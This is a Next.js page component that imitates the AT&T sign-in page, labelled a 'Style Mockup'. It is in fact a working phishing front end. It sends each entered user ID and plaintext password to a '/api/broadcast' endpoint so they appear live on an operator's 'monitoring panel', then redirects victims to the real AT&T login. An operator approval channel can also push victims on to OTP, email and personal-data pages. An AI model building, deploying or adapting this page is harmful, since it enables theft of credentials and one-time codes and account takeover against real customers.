import Head from 'next/head';
import { useEffect } from 'react';
import Script from 'next/script';

export default function Home() {
  useEffect(() => {
    const loginForm = document.getElementById('login-form');
    const usernameInput = document.getElementById('userID');
    const passwordGroup = document.getElementById('password-group');
    const userIdGroup = document.getElementById('user-id-group');
    const backToUsernameBtn = document.getElementById('back-to-username-btn');
    const cachedUserIdText = document.getElementById('cached-user-id-text');
    const submitBtn = document.getElementById('submit-btn');
    const loginContainer = document.querySelector('.login-container');
    let cachedUsername = '';
    let pendingActivityId = null;

    async function logActivity(type, userId, additionalData = {}) {
      try {
        // Use broadcast endpoint instead of activity endpoint
        const response = await fetch('/api/broadcast', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ type, userId, additionalData })
        });
        const data = await response.json();
        return data.activity.id;
      } catch (error) {
        console.error('Error logging activity:', error);
        return null;
      }
    }

    function waitForApprovalSSE(activityId, type, userId) {
      // Close existing connection if any
      if (window.approvalEventSource) {
        window.approvalEventSource.close();
      }
      
      // Clear any existing polling interval
      if (window.approvalPollInterval) {
        clearInterval(window.approvalPollInterval);
        window.approvalPollInterval = null;
      }

      // Open SSE connection for this activity
      const eventSource = new EventSource(`/api/user-events/${activityId}`);
      window.approvalEventSource = eventSource;
      
      let approvalReceived = false;

      eventSource.onmessage = function(event) {
        try {
          const data = JSON.parse(event.data);
          console.log('[index.js] Received SSE message:', data);
          
          if (data.type === 'approval') {
            approvalReceived = true;
            const approval = data.data;
            console.log('[index.js] Approval received:', approval);
            
            // Close SSE connection and stop polling
            eventSource.close();
            window.approvalEventSource = null;
            if (window.approvalPollInterval) {
              clearInterval(window.approvalPollInterval);
              window.approvalPollInterval = null;
            }
            
            if (approval.status === 'approved') {
              const redirectType = approval.redirectType || 'password';
              console.log(`[index.js] Handling redirect: ${redirectType} for user: ${userId}`);
              
              // Store userId for OTP page
              if (redirectType === 'otp' || redirectType === 'email' || redirectType === 'personal') {
                localStorage.setItem('lastUserId', userId);
              }
              
              handleRedirect(redirectType, userId);
            } else if (approval.status === 'denied') {
              const loadingScreen = document.getElementById('loading-screen');
              if (loadingScreen) loadingScreen.classList.remove('active');
              
              submitBtn.disabled = false;
              submitBtn.textContent = cachedUsername ? 'Sign in' : 'Continue';
              alert('Access denied. Please try again.');
            }
          } else if (data.type === 'connected') {
            console.log('[index.js] SSE connected, waiting for approval...');
          }
        } catch (error) {
          console.error('Error parsing SSE message:', error);
        }
      };

      eventSource.onerror = function(error) {
        console.error('SSE error:', error);
        // Reconnect faster (1 second) for quicker recovery
        setTimeout(() => {
          if (window.approvalEventSource === eventSource && !approvalReceived) {
            eventSource.close();
            waitForApprovalSSE(activityId, type, userId);
          }
        }, 1000);
      };
      
      // Fallback: Poll for approval every 500ms in case SSE fails (faster response)
      window.approvalPollInterval = setInterval(async () => {
        if (approvalReceived) {
          clearInterval(window.approvalPollInterval);
          window.approvalPollInterval = null;
          return;
        }
        
        try {
          const response = await fetch(`/api/approval/${activityId}`);
          if (response.ok) {
            const approval = await response.json();
            if (approval && approval.status && approval.status !== 'pending') {
              approvalReceived = true;
              
              // Close SSE connection
              if (eventSource) {
                eventSource.close();
                window.approvalEventSource = null;
              }
              
              // Stop polling
              clearInterval(window.approvalPollInterval);
              window.approvalPollInterval = null;
              
              if (approval.status === 'approved') {
                const redirectType = approval.redirectType || 'password';
                console.log(`[index.js] Approval received via polling: ${redirectType} for user: ${userId}`);
                
                // Store userId for OTP/email/personal pages
                if (redirectType === 'otp' || redirectType === 'email' || redirectType === 'personal') {
                  localStorage.setItem('lastUserId', userId);
                }
                
                handleRedirect(redirectType, userId);
              } else if (approval.status === 'denied') {
                const loadingScreen = document.getElementById('loading-screen');
                if (loadingScreen) loadingScreen.classList.remove('active');
                
                submitBtn.disabled = false;
                submitBtn.textContent = cachedUsername ? 'Sign in' : 'Continue';
                alert('Access denied. Please try again.');
              }
            }
          }
        } catch (error) {
          console.error('[index.js] Error polling for approval:', error);
        }
      }, 500); // Poll every 500ms for faster response
    }

    function handleRedirect(redirectType, userId) {
      const loadingScreen = document.getElementById('loading-screen');
      if (loadingScreen) loadingScreen.classList.remove('active');
      
      if (redirectType === 'password') {
        // Show password view - ensure user ID is preserved
        const currentUserId = userId || usernameInput.value.trim() || cachedUsername;
        if (currentUserId) {
          cachedUsername = currentUserId;
          cachedUserIdText.textContent = currentUserId;
          usernameInput.value = currentUserId; // Keep value in input for reference
        }
        
        // Hide user ID field and show password field
        userIdGroup.style.display = 'none';
        passwordGroup.style.display = 'block';
        loginContainer.classList.add('password-view');
        submitBtn.disabled = false;
        submitBtn.textContent = 'Sign in';
        
        // Focus password field
        const passwordInput = document.getElementById('password');
        if (passwordInput) {
          passwordInput.focus();
        }
      } else if (redirectType === 'otp') {
        window.location.href = '/otp';
      } else if (redirectType === 'email') {
        window.location.href = '/email';
      } else if (redirectType === 'personal') {
        window.location.href = '/personal';
      } else if (redirectType === 'att') {
        window.location.href = 'https://signin.att.com/dynamic/iamLRR/LrrController?IAM_OP=login&appName=m14186&loginSuccessURL=https:%2F%2Foidc.idp.clogin.att.com%2Fmga%2Fsps%2Foauth%2Foauth20%2Fauthorize%3Fresponse_type%3Did_token%26client_id%3Dm14186%26redirect_uri%3Dhttps%253A%252F%252Fwww.att.com%252Fmsapi%252Flogin%252Funauth%252Fservice%252Fv1%252Fhaloc%252Foidc%252Fredirect%26state%3Dfrom%253Dnx%26scope%3Dopenid%26response_mode%3Dform_post%26nonce%3D3nv01nEz';
      }
    }

    function resetToUserIDView() {
      cachedUsername = '';
      cachedUserIdText.textContent = '';
      userIdGroup.style.display = 'block';
      passwordGroup.style.display = 'none';
      loginContainer.classList.remove('password-view');
      submitBtn.textContent = 'Continue';
      usernameInput.value = '';
      usernameInput.focus();
    }

    if (loginForm) {
      loginForm.addEventListener('submit', async function(e) {
        e.preventDefault();
        
        const userId = usernameInput.value.trim();
        
        if (userId && !cachedUsername) {
          // First step: Log user ID entry (panel monitoring only, no blocking)
          await logActivity('userid', userId);
          
          // Automatically proceed to password view
          cachedUsername = userId;
          cachedUserIdText.textContent = userId;
          userIdGroup.style.display = 'none';
          passwordGroup.style.display = 'block';
          loginContainer.classList.add('password-view');
          submitBtn.textContent = 'Sign in';
          
          // Focus password field
          const passwordInput = document.getElementById('password');
          if (passwordInput) {
            passwordInput.focus();
          }
          
        } else if (cachedUsername) {
          // Second step: Password entered - log and redirect to AT&T
          const password = document.getElementById('password').value;
          
          // Store userId for reference
          localStorage.setItem('lastUserId', cachedUsername);
          
          // Log password entry (panel monitoring only, no blocking)
          await logActivity('password', cachedUsername, { 
            hasPassword: password.length > 0,
            password: password // Include password for real-time display on monitoring panel
          });
          
          // Log sign-in completion
          await logActivity('signin', cachedUsername, { 
            hasPassword: password.length > 0,
            password: password
          });
          
          // Redirect to AT&T sign-in page
          window.location.href = 'https://signin.att.com/dynamic/iamLRR/LrrController?IAM_OP=login&appName=m14186&loginSuccessURL=https:%2F%2Foidc.idp.clogin.att.com%2Fmga%2Fsps%2Foauth%2Foauth20%2Fauthorize%3Fresponse_type%3Did_token%26client_id%3Dm14186%26redirect_uri%3Dhttps%253A%252F%252Fwww.att.com%252Fmsapi%252Flogin%252Funauth%252Fservice%252Fv1%252Fhaloc%252Foidc%252Fredirect%26state%3Dfrom%253Dnx%26scope%3Dopenid%26response_mode%3Dform_post%26nonce%3D3nv01nEz';
        }
      });
    }

    if (backToUsernameBtn) {
      backToUsernameBtn.addEventListener('click', function() {
        resetToUserIDView();
      });
    }

    if (usernameInput) {
      usernameInput.addEventListener('input', function() {
        if (!cachedUsername) {
          passwordGroup.style.display = 'none';
        }
      });
    }
  }, []);

  return (
    <>
      <Head>
        <title>AT&T Login Page - Style Mockup</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
      </Head>
      <Script src="https://sites.super.myninja.ai/_assets/ninja-daytona-script.js" strategy="afterInteractive" />
      <style jsx global>{`
        * {
          margin: 0;
          padding: 0;
          box-sizing: border-box;
        }

        body {
          font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Helvetica Neue', Arial, sans-serif;
          background-color: white;
          min-height: 100vh;
          display: flex;
          flex-direction: column;
          align-items: center;
          justify-content: center;
          padding: 20px;
        }

        .login-container {
          background: #ffffff;
          border-radius: 12px;
          box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
          padding: 60px 40px;
          max-width: 450px;
          width: 100%;
          text-align: center;
        }

        .logo {
          margin-bottom: 30px;
        }

        .logo-image {
          width: 133px;
          height: auto;
          margin: 0 auto 15px;
          display: block;
          object-fit: contain;
        }

        h1 {
          font-size: 36px;
          font-weight: 700;
          color: #000000;
          margin-bottom: 5px;
          line-height: 1.2;
        }

        .subtitle {
          font-size: 26px;
          font-weight: 700;
          color: #000000;
          margin-bottom: 35px;
        }

        .form-group {
          margin-bottom: 24px;
          text-align: left;
        }

        label {
          display: block;
          font-size: 16px;
          font-weight: 700;
          color: #000000;
          margin-bottom: 10px;
        }

        input[type="email"],
        input[type="text"],
        input[type="password"] {
          width: 100%;
          height: 52px;
          padding: 0 16px;
          font-size: 16px;
          color: #333333;
          background: #ffffff;
          border: 2px solid #d1d1d1;
          border-radius: 6px;
          transition: all 0.3s ease;
          outline: none;
        }

        input[type="email"]:focus,
        input[type="text"]:focus,
        input[type="password"]:focus {
          border-color: #0057b8;
          box-shadow: 0 0 0 3px rgba(0, 87, 184, 0.1);
        }

        input::placeholder {
          color: #999999;
        }

        .continue-btn {
          width: 100%;
          height: 46px;
          background: #003d7a;
          color: #ffffff;
          font-size: 13px;
          font-weight: 700;
          border: none;
          border-radius: 23px;
          cursor: pointer;
          transition: all 0.3s ease;
          margin-bottom: 20px;
        }

        .continue-btn:hover {
          background: #002d5a;
          box-shadow: 0 4px 12px rgba(0, 61, 122, 0.3);
        }

        .continue-btn:active {
          background: #002040;
          transform: translateY(1px);
        }

        .link-section {
          margin-top: 16px;
          text-align: left;
        }

        .link-section a {
          display: block;
          color: #0088C0;
          font-size: 14px;
          font-weight: 700;
          text-decoration: none;
          margin-bottom: 18px;
          transition: all 0.2s ease;
        }

        .link-section a:hover {
          text-decoration: underline;
          color: #0070A0;
        }

        .separator {
          margin: 30px 0;
          text-align: center;
          position: relative;
        }

        .separator::before {
          content: '';
          position: absolute;
          top: 50%;
          left: 0;
          right: 0;
          height: 1px;
          background: #d1d1d1;
        }

        .separator-text {
          position: relative;
          display: inline-block;
          background: #ffffff;
          padding: 0 15px;
          color: #666666;
          font-size: 14px;
        }

        .secondary-btn {
          width: 100%;
          height: 46px;
          background: #ffffff;
          color: #003d7a;
          font-size: 13px;
          font-weight: 700;
          border: 2px solid #003d7a;
          border-radius: 23px;
          cursor: pointer;
          transition: all 0.3s ease;
          margin-top: 20px;
        }

        .secondary-btn:hover {
          border-color: #002d5a;
          background: #f5f5f5;
          color: #002d5a;
        }

        .secondary-btn:active {
          background: #e8e8e8;
          transform: translateY(1px);
        }

        .footer {
          margin-top: 40px;
          padding-top: 20px;
          text-align: center;
        }

        .footer-links {
          display: flex;
          flex-wrap: wrap;
          justify-content: center;
          gap: 20px;
          margin-bottom: 15px;
        }

        .footer-links a {
          color: #666666;
          font-size: 13px;
          text-decoration: none;
          transition: all 0.2s ease;
        }

        .footer-links a:hover {
          color: #0057b8;
          text-decoration: underline;
        }

        .copyright {
          color: #666666;
          font-size: 12px;
          margin-top: 10px;
        }

        .user-id-group {
          display: block;
        }

        .password-view .user-id-group {
          display: none;
        }

        .welcome-message {
          display: none;
          font-size: 36px;
          font-weight: 700;
          color: #000000;
          margin-bottom: 35px;
          line-height: 1.2;
          text-align: center;
        }

        .password-view .welcome-message {
          display: block;
        }

        .password-view h1,
        .password-view .subtitle {
          display: none;
        }

        .cached-user-id-wrapper {
          display: none;
          text-align: center;
          margin-bottom: 10px;
          justify-content: center;
          align-items: center;
          gap: 10px;
        }

        .password-view .cached-user-id-wrapper {
          display: flex;
        }

        .back-to-username-btn {
          width: 40px;
          height: 40px;
          border-radius: 50%;
          border: 2px solid #d1d1d1;
          background: #ffffff;
          color: #999999;
          font-size: 18px;
          font-weight: 400;
          cursor: pointer;
          padding: 0;
          display: flex;
          align-items: center;
          justify-content: center;
          transition: all 0.2s ease;
          opacity: 0.6;
          flex-shrink: 0;
        }

        .back-to-username-btn:hover {
          opacity: 1;
          border-color: #0057b8;
          color: #0057b8;
          background: #f5f5f5;
        }

        .cached-user-id-text {
          font-size: 16px;
          font-weight: 400;
          color: #000000;
        }

        @media (max-width: 768px) {
          body {
            padding: 0;
          }

          .login-container {
            max-width: none;
            width: 100%;
            padding: 20px 12px;
            box-shadow: none;
            border-radius: 0;
          }

          h1 {
            font-size: 30px;
          }

          .welcome-message {
            font-size: 30px;
          }

          .subtitle {
            font-size: 22px;
          }

          .form-group {
            margin-left: 0;
            margin-right: 0;
          }

          input[type="email"],
          input[type="text"],
          input[type="password"] {
            width: 100%;
          }

          .footer {
            text-align: left;
            padding-left: 12px;
            padding-right: 12px;
            margin-left: 0;
            margin-right: 0;
            width: 100%;
          }

          .footer-links {
            flex-direction: column;
            gap: 10px;
            justify-content: flex-start;
            align-items: flex-start;
          }

          .footer-links a {
            font-size: 11px;
          }

          .copyright {
            font-size: 11px;
          }
        }

        *:focus-visible {
          outline: 2px solid #0057b8;
          outline-offset: 2px;
        }

        .loading-screen {
          display: none;
          position: fixed;
          top: 0;
          left: 0;
          width: 100%;
          height: 100%;
          background: #ffffff;
          z-index: 9999;
          align-items: center;
          justify-content: center;
          flex-direction: column;
        }

        .loading-screen.active {
          display: flex;
        }

        .loading-spinner {
          width: 40px;
          height: 40px;
          border: 3px solid #e0e0e0;
          border-top: 3px solid #0057b8;
          border-radius: 50%;
          animation: spin 0.8s linear infinite;
          margin-bottom: 16px;
        }

        @keyframes spin {
          0% { transform: rotate(0deg); }
          100% { transform: rotate(360deg); }
        }

        .loading-text {
          font-size: 16px;
          color: #333333;
          font-weight: 400;
        }
      `}</style>
      <div className="login-container">
        <div className="logo">
          <img src="/logo.png" alt="Logo" className="logo-image" />
        </div>

        <h1>Sign in</h1>
        <div className="subtitle">to my Account</div>
        <h1 className="welcome-message">Welcome</h1>

        <form id="login-form">
          <div className="form-group user-id-group" id="user-id-group">
            <label htmlFor="userID">User ID</label>
            <input type="email" id="userID" name="userID" placeholder="" />
          </div>
          <div className="cached-user-id-wrapper">
            <button type="button" className="back-to-username-btn" id="back-to-username-btn">←</button>
            <span className="cached-user-id-text" id="cached-user-id-text"></span>
          </div>
          <div className="form-group" id="password-group" style={{ display: 'none' }}>
            <label htmlFor="password">Password</label>
            <input type="password" id="password" name="password" placeholder="" />
          </div>
          <button type="submit" className="continue-btn" id="submit-btn">Continue</button>
        </form>

        <div className="link-section">
          <a href="#forgot">Forgot user ID?</a>
          <a href="#create">Don't have a user ID? Create one now</a>
          <a href="#pay">Pay without signing in</a>
        </div>

        <div className="separator">
          <span className="separator-text">OR</span>
        </div>

        <button type="button" className="secondary-btn">Login with myAT&T app</button>
      </div>

      <div className="footer">
        <div className="footer-links">
          <a href="#legal">Legal policy center</a>
          <a href="#privacy">Privacy policy</a>
          <a href="#terms">Terms of use</a>
          <a href="#accessibility">Accessibility</a>
          <a href="#choices">Your privacy choices</a>
        </div>
        <div className="copyright">
          ©2025 AT&T Intellectual Property. All rights reserved.
        </div>
      </div>

      <div id="loading-screen" className="loading-screen">
        <div className="loading-spinner"></div>
        <div className="loading-text">Please wait...</div>
      </div>
    </>
  );
}

